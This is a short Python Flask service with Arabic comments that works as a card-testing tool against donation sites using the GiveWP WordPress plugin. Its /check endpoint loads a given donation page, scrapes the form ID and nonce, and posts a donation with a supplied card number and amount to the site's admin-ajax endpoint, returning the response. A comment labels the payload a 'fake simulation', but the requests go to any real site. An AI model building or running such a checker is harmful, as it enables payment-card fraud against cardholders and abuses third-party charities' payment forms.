from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

@app.route("/check", methods=["GET"])
def check():
    url = request.args.get("url")
    card = request.args.get("card")
    amount = request.args.get("amount")

    if not url or not card:
        return jsonify({"result": "Error: url and card required"})

    try:
        session = requests.Session()

        # 1️⃣ دخول صفحة التبرع
        page = session.get(url, timeout=10).text

        # 2️⃣ استخراج form-id و nonce (تقريبي)
        form_id = re.search(r'name="give-form-id" value="(.*?)"', page)
        nonce = re.search(r'name="give-form-hash" value="(.*?)"', page)

        if not form_id or not nonce:
            return jsonify({"result": "Error: form tokens not found"})

        form_id = form_id.group(1)
        nonce = nonce.group(1)

        # 3️⃣ تجهيز بيانات الدفع (fake simulation)
        payload = {
            "action": "give_process_donation",
            "give-form-id": form_id,
            "give-form-hash": nonce,
            "give-amount": amount,
            "card": card
        }

        # 4️⃣ إرسال الطلب
        resp = session.post(
            url.split("/give")[0] + "/wp-admin/admin-ajax.php",
            data=payload,
            timeout=10
        )

        return jsonify({
            "result": resp.text[:300]
        })

    except Exception as e:
        return jsonify({
            "result": f"Error: {str(e)}"
        })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
